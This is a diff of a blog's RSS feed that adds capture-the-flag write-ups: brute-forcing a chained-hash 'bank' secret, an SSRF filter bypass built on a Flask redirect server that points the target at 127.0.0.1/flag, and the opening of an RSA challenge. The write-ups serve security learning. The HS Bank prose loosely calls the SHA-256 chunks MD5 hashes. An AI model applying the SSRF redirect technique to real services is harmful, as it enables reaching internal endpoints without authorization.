@@ -1,4 +1,194 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Writeups on The Coach Cave</title><link>https://coachtinho.github.io/posts/writeups/</link><description>Recent content in Writeups on The Coach Cave</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Tue, 24 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coachtinho.github.io/posts/writeups/index.xml" rel="self" type="application/rss+xml"/><item><title>HSCTF - High School Math</title><link>https://coachtinho.github.io/posts/2022/05/hsctf-high-school-math/</link><pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate><guid>https://coachtinho.github.io/posts/2022/05/hsctf-high-school-math/</guid><description>This challenge was part of a CTF event hosted by HackerSchool.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Writeups on The Coach Cave</title><link>https://coachtinho.github.io/posts/writeups/</link><description>Recent content in Writeups on The Coach Cave</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Wed, 25 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coachtinho.github.io/posts/writeups/index.xml" rel="self" type="application/rss+xml"/><item><title>HSCTF - HS Bank</title><link>https://coachtinho.github.io/posts/2022/05/hsctf-hs-bank/</link><pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate><guid>https://coachtinho.github.io/posts/2022/05/hsctf-hs-bank/</guid><description>This challenge was part of a CTF event hosted by HackerSchool.
+Challenge statement For this challenge, a single python script was provided:
+import string import hashlib import random def banc_pass(password2hash): hashresult = hashlib.md5(password2hash).digest() sha1 = hashlib.sha1(hashresult) sha256 = hashlib.sha256(sha1.digest()) for i in range(0, 10): sha1 = hashlib.sha1(sha256.digest()) sha256 = hashlib.sha256(sha1.digest()) output = sha256.hexdigest() return output def impossible_pass(): a = random.</description><content type="html"><![CDATA[<p>This challenge was part of a CTF event hosted by <a href="https://hackerschool.io">HackerSchool</a>.</p>
+<p><img src="logo.png" alt="logo"></p>
+<h2 id="challenge-statement">Challenge statement</h2>
+<p>For this challenge, a single python script was provided:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">hashlib</span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">random</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">banc_pass</span>(password2hash):
+</span></span><span style="display:flex;"><span>	hashresult = hashlib.md5(password2hash).digest()
+</span></span><span style="display:flex;"><span>	sha1 = hashlib.sha1(hashresult)
+</span></span><span style="display:flex;"><span>	sha256 = hashlib.sha256(sha1.digest())
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, <span style="color:#3677a9">10</span>):
+</span></span><span style="display:flex;"><span>		sha1 = hashlib.sha1(sha256.digest())
+</span></span><span style="display:flex;"><span>		sha256 = hashlib.sha256(sha1.digest())
+</span></span><span style="display:flex;"><span>	output = sha256.hexdigest()
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> output
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">impossible_pass</span>():
+</span></span><span style="display:flex;"><span>	a = random.choice(string.ascii_letters) 
+</span></span><span style="display:flex;"><span>	b = random.choice(string.ascii_letters)
+</span></span><span style="display:flex;"><span>	c = random.choice(string.ascii_letters)
+</span></span><span style="display:flex;"><span>	secret = banc_pass((a+b+c).encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> secret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">banc_login</span>():
+</span></span><span style="display:flex;"><span>	secret_of_the_day = <span style="color:#ed9d13">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">10</span>):
+</span></span><span style="display:flex;"><span>		secret_of_the_day += impossible_pass()
+</span></span><span style="display:flex;"><span>	<span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;Bem vindo ao HSBanco!</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;Vamos mostrar de seguida o segredo do dia!</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;Segredo do dia é </span><span style="color:#ed9d13">{}</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>.format(secret_of_the_day))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic"># On that day the secret was: da7769f9bb80ce4ed1e4977403d9aff67f5a5e0e50686aeff5fa493e850a1d2a6c9e02a05a59c51c624fb77684e40086cb07438eba32c42074df2a718be41ee9fc338739267b25b92765ebdee1a767c8855e32d2a2e0cd1216ba1ddeae6933a7a2e692e1a6413f718c8a2078f8ce0872c76e2a287d240af4b81b3ce1c193a6316a5a8fe23dcc00ce5b86bca445d98cb08615b16a3766cc12004a5a2bcbc2d3e04cefbd24bf6394c778a1f88b5b50283b972177388bdfa645f667762472704c6477e32e728d9935a26eb4e621fd4f83e93a9bd32ec812a104c4e0ed42c49ab8c5d3159d056764b89c4cd1d310026a083cb7cb0b9af91728235c59ae4dde83e956184224d98c9d59fef5d1e61c36498958a16a4529efc162effd15cacf5359466093337c2a06ffeb72c4f54bf992651ca52591169aee8301e6dd30e9f2d68f19ad</span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">if</span> __name__ == <span style="color:#ed9d13">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	banc_login()
+</span></span></code></pre></div><p>This python script showcases the generation of a secret originated from a <strong>password</strong> as well as a generated secret.
+The objective of the challenge is to figure out what <strong>password</strong> generated the provided secret and enclose it within <em>HS{}</em> to get the flag.</p>
+<h2 id="solution">Solution</h2>
+<p>Analysing the code, the first aspect that comes to mind is that the secret is created by concatenating 10 different results from the <code>impossible_pass</code> function.
+This function simply picks 3 random ascii letters and returns the MD5 hash of their concatenation.
+As a result, the secret can be split into 10 different MD5 hashes.
+Since each of these hashes is calculated from only 3 random ascii letters, the search space is small enough that each one of them can be brute forced individually.</p>
+<h2 id="cracking-the-password">Cracking the password</h2>
+<p>The <strong>password</strong> can be obtained through the following script, which took only 8 seconds to run on my machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">hashlib</span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">random</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># Split secret into 10 different hashes</span>
+</span></span><span style="display:flex;"><span>secret = <span style="color:#ed9d13">&#34;da7769f9bb80ce4ed1e4977403d9aff67f5a5e0e50686aeff5fa493e850a1d2a6c9e02a05a59c51c624fb77684e40086cb07438eba32c42074df2a718be41ee9fc338739267b25b92765ebdee1a767c8855e32d2a2e0cd1216ba1ddeae6933a7a2e692e1a6413f718c8a2078f8ce0872c76e2a287d240af4b81b3ce1c193a6316a5a8fe23dcc00ce5b86bca445d98cb08615b16a3766cc12004a5a2bcbc2d3e04cefbd24bf6394c778a1f88b5b50283b972177388bdfa645f667762472704c6477e32e728d9935a26eb4e621fd4f83e93a9bd32ec812a104c4e0ed42c49ab8c5d3159d056764b89c4cd1d310026a083cb7cb0b9af91728235c59ae4dde83e956184224d98c9d59fef5d1e61c36498958a16a4529efc162effd15cacf5359466093337c2a06ffeb72c4f54bf992651ca52591169aee8301e6dd30e9f2d68f19ad&#34;</span>
+</span></span><span style="display:flex;"><span>hashes = [secret[i:i+<span style="color:#3677a9">64</span>] <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, <span style="color:#24909d">len</span>(secret), <span style="color:#3677a9">64</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">banc_pass</span>(password2hash):
+</span></span><span style="display:flex;"><span>	hashresult = hashlib.md5(password2hash).digest()
+</span></span><span style="display:flex;"><span>	sha1 = hashlib.sha1(hashresult)
+</span></span><span style="display:flex;"><span>	sha256 = hashlib.sha256(sha1.digest())
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, <span style="color:#3677a9">10</span>):
+</span></span><span style="display:flex;"><span>		sha1 = hashlib.sha1(sha256.digest())
+</span></span><span style="display:flex;"><span>		sha256 = hashlib.sha256(sha1.digest())
+</span></span><span style="display:flex;"><span>	output = sha256.hexdigest()
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> output
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_secret</span>(target):
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> a <span style="color:#6ab825;font-weight:bold">in</span> string.ascii_letters:
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">for</span> b <span style="color:#6ab825;font-weight:bold">in</span> string.ascii_letters:
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> string.ascii_letters:
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">if</span> banc_pass((a+b+c).encode()) == target:
+</span></span><span style="display:flex;"><span>                    <span style="color:#6ab825;font-weight:bold">return</span> a+b+c
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#ed9d13">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">if</span> __name__ == <span style="color:#ed9d13">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    password = <span style="color:#ed9d13">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> target <span style="color:#6ab825;font-weight:bold">in</span> hashes:
+</span></span><span style="display:flex;"><span>        <span style="color:#999;font-style:italic"># Brute force each hash individually</span>
+</span></span><span style="display:flex;"><span>        password += get_secret(target)
+</span></span><span style="display:flex;"><span>    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;HS{&#34;</span> + password + <span style="color:#ed9d13">&#34;}&#34;</span>)
+</span></span></code></pre></div>]]></content></item><item><title>HSCTF - HS Verifier</title><link>https://coachtinho.github.io/posts/2022/05/hsctf-hs-verifier/</link><pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate><guid>https://coachtinho.github.io/posts/2022/05/hsctf-hs-verifier/</guid><description>This challenge was part of a CTF event hosted by HackerSchool.
+Challenge statement Being a web challenge, a website is provided in the statement, alongside the application&amp;rsquo;s source code and a Dockerfile.
+The website asks for two links, and after clicking &amp;ldquo;Go!&amp;rdquo;, displays a diff between the two pages.
+Difference between example.com and github.com
+In the source code we can find the following endpoints for the application:</description><content type="html"><![CDATA[<p>This challenge was part of a CTF event hosted by <a href="https://hackerschool.io">HackerSchool</a>.</p>
+<p><img src="logo.png" alt="logo"></p>
+<h2 id="challenge-statement">Challenge statement</h2>
+<p>Being a web challenge, a website is provided in the statement, alongside the application&rsquo;s source code and a Dockerfile.</p>
+<p><img src="website.png" alt="website"></p>
+<p>The website asks for two links, and after clicking &ldquo;Go!&rdquo;, displays a diff between the two pages.</p>
+<figure><img src="diff.png"
+         alt="Difference between example.com and github.com"/><figcaption>
+            <p>Difference between example.com and github.com</p>
+        </figcaption>
+</figure>
+
+<p>In the source code we can find the following endpoints for the application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>app.get(<span style="color:#ed9d13">&#39;/&#39;</span>, (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>	res.render(<span style="color:#ed9d13">&#39;index&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.get(<span style="color:#ed9d13">&#39;/flag&#39;</span>, (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span>(req.connection.remoteAddress == <span style="color:#ed9d13">&#39;::1&#39;</span>){
+</span></span><span style="display:flex;"><span>		res.send(flag)}
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>		res.send(<span style="color:#ed9d13">&#34;Forbidden&#34;</span>, <span style="color:#3677a9">503</span>)}
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.post(<span style="color:#ed9d13">&#39;/diff&#39;</span>, <span style="color:#6ab825;font-weight:bold">async</span> (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">let</span> { url1, url2 } = req.body
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#6ab825;font-weight:bold">typeof</span> url1 !== <span style="color:#ed9d13">&#39;string&#39;</span> || <span style="color:#6ab825;font-weight:bold">typeof</span> url2 !== <span style="color:#ed9d13">&#39;string&#39;</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> res.send({error: <span style="color:#ed9d13">&#39;Inválido formato&#39;</span>})
+</span></span><span style="display:flex;"><span>	};
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">let</span> urls = [url1, url2];
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">for</span>(url <span style="color:#6ab825;font-weight:bold">of</span> urls){
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">const</span> valid = <span style="color:#6ab825;font-weight:bold">await</span> validifyURL(url);
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">if</span>(!valid){
+</span></span><span style="display:flex;"><span>			<span style="color:#6ab825;font-weight:bold">return</span> res.send({error: <span style="color:#ed9d13">`Request to </span><span style="color:#ed9d13">${</span>url<span style="color:#ed9d13">}</span><span style="color:#ed9d13"> was denied`</span>});
+</span></span><span style="display:flex;"><span>		};
+</span></span><span style="display:flex;"><span>	};
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">const</span> difference = <span style="color:#6ab825;font-weight:bold">await</span> diffURLs(urls);
+</span></span><span style="display:flex;"><span>	res.render(<span style="color:#ed9d13">&#39;diff&#39;</span>, {
+</span></span><span style="display:flex;"><span>		lines: difference
+</span></span><span style="display:flex;"><span>	});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>From this snippet, it is clear that the objective of the challenge is to somehow get a request to the <code>/flag</code> endpoint coming from <strong>localhost</strong>.
+This can be achieved by tricking the web server into perform that request through an <a href="https://portswigger.net/web-security/ssrf">SSRF</a> vulnerability.</p>
+<h2 id="working-the-problem">Working the problem</h2>
+<p>At first it may seem that simply placing &ldquo;localhost&rdquo; on one of the main page&rsquo;s inputs, would display the flag in the diff.
+However, when attempting that strategy, the server sends back this response:</p>
+<p><img src="denied.png" alt="denied"></p>
+<p>This is due to the <code>validifyURL</code> function, also provided in the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">async</span> <span style="color:#6ab825;font-weight:bold">function</span> validifyURL(url){
+</span></span><span style="display:flex;"><span>	valid = <span style="color:#6ab825;font-weight:bold">await</span> fetch(url, {agent: ssrfFilter(url)})
+</span></span><span style="display:flex;"><span>	.then((response) =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>	.<span style="color:#6ab825;font-weight:bold">catch</span>(error =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>
+</span></span><span style="display:flex;"><span>	});
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> valid;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>There is an SSRF filter implemented, which blocks any requested directed to itself. Providing the public IP also doesn&rsquo;t work.
+The solution is to somehow provide a link that passes the SSRF filter, but still makes a call to localhost when performing the diff.
+Note that the response from the SSRF filter is ignored.
+This means that the application must make another request in order to perform the diff, as is confirmed in the <code>diffURLs</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">async</span> <span style="color:#6ab825;font-weight:bold">function</span> diffURLs(urls){
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">try</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">const</span> pageOne = <span style="color:#6ab825;font-weight:bold">await</span> fetch(urls[<span style="color:#3677a9">0</span>]).then((r =&gt; {<span style="color:#6ab825;font-weight:bold">return</span> r.text()}));
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">const</span> pageTwo = <span style="color:#6ab825;font-weight:bold">await</span> fetch(urls[<span style="color:#3677a9">1</span>]).then((r =&gt; {<span style="color:#6ab825;font-weight:bold">return</span> r.text()}));
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> Diff.diffLines(pageOne, pageTwo)
+</span></span><span style="display:flex;"><span>	} <span style="color:#6ab825;font-weight:bold">catch</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#ed9d13">&#39;error!&#39;</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h2 id="solution">Solution</h2>
+<p>By providing a link to a controlled server, it is possible to redirect the SSRF filter&rsquo;s request to a valid URL and then redirect the next request to localhost.
+A way to achieve this is through a simple <a href="https://flask.palletsprojects.com/en/2.1.x/">Flask</a> application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">flask</span> <span style="color:#6ab825;font-weight:bold">import</span> Flask, redirect, g
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app = Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local = <span style="color:#6ab825;font-weight:bold">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ffa500">@app</span>.route(<span style="color:#ed9d13">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">global</span> local
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#6ab825;font-weight:bold">not</span> local:
+</span></span><span style="display:flex;"><span>        local = <span style="color:#6ab825;font-weight:bold">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> redirect(<span style="color:#ed9d13">&#34;https://github.com&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> redirect(<span style="color:#ed9d13">&#34;http://127.0.0.1/flag&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.run(<span style="color:#ed9d13">&#39;0.0.0.0&#39;</span>, <span style="color:#3677a9">5000</span>)
+</span></span></code></pre></div><p>Providing this web server&rsquo;s link to the site will display the flag on the page.</p>
+<blockquote>
+<p>NOTE: with this implementation, only one of the links can point to the flask application</p>
+</blockquote>
+<figure><img src="flag.png"
+         alt="The censored flag is shown at the bottom of the page"/><figcaption>
+            <p>The censored flag is shown at the bottom of the page</p>
+        </figcaption>
+</figure>
+
+]]></content></item><item><title>HSCTF - High School Math</title><link>https://coachtinho.github.io/posts/2022/05/hsctf-high-school-math/</link><pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate><guid>https://coachtinho.github.io/posts/2022/05/hsctf-high-school-math/</guid><description>This challenge was part of a CTF event hosted by HackerSchool.
 Challenge statement The only artifact provided in this challenge was the following python file:
 #!/usr/bin/env python3 from Crypto.Util.number import getPrime, bytes_to_long flag = bytes_to_long(open(&amp;#34;flag.txt&amp;#34;, &amp;#34;rb&amp;#34;).read()) a = getPrime(1024) b = getPrime(1024) n = a*b e = 65537 c = pow(flag, e, n) print(f&amp;#34;{n = }&amp;#34;) print(f&amp;#34;{a**2 + b**2 + n**2= }&amp;#34;) print(f&amp;#34;{c = }&amp;#34;) # n = 13436543552497379694388600283360717813635824342586727821299891097425087808451129657132646384161598295682244109046681967399152114113039949692442357146097324414403714448303353670168683482849419889475073883021965128721280871508465237809638020307982223244592542117796329109625703795447628394080318467373338188481184094970667886099372277067791758310028719297560663656767841021135681599495175761141006932805280225013110829549034519947236406007628716612049188313632934875069078519054193264853872613184570847857034661356936183017256590466090548910652801538879801014480661747240873360666285731745662148831527068007355413188887 # a**2 + b**2 + n**2 = 180540702638158904555313141999781749074003490908937774272093358209266579892723492583838455210340254147384930625316273582841838217801840890803861355556649018897578690770481254908858674542005577405915622285279899406971259896933489523670420717548639427335001803646983644791045656241401673687187726280876455073539111273773923883651993721358207846391313978350794244107965610913946876423239477612677938072329660651267448386329961458280475278573633820153440808541964695106167741185667955129940403776069295440293733430131735411584242714529642808819687910706106548758202498227083847917068114857875765168196675243257199097750520922525008125630838354307923475925584698238491952278590917901260659431105142243114069887362690687689038563636726039494545276092127293952348826896731339109871895632727377083838126864650984923928053803715088333345176007341201339462938609657841855916777656479086368136149570496132274352713796154428855169222471580102944991273633691501186315783714064203309635192900325313597761340564885530634467783714002020973412451854154980882417205738681469209886776431322230847829601036652620826985668320534712843426539466194377506625250178274870835255571396913574981965993196321085336599004619779060743928193570956088985405537320419 # c = 4310162057906442585564591225725935614592110681401636449166311033403516541185696386758618323817603267436921298898073920430466461400657427528486851687645951458584703781966233462122925386869932442983177035396942716981989385980683508193428811207038681424346099327620840921382090799316092363704925374518170400010075824518901618979810132913400886887431741003736016069099461409316070555522686870318106487018663155309957528733145374170951930363390975465599161111285429601177974353905063294989440175780556563289724596829681492208800996187944182874779465052051746026368620569256527794801333872872427893580775064733755099734518 Solution The first lines of the script show a standard RSA scenario where a key is generated and used to encrypt the flag.</description><content type="html"><![CDATA[<p>This challenge was part of a CTF event hosted by <a href="https://hackerschool.io">HackerSchool</a>.</p>
 <p><img src="logo.png" alt="logo"></p>
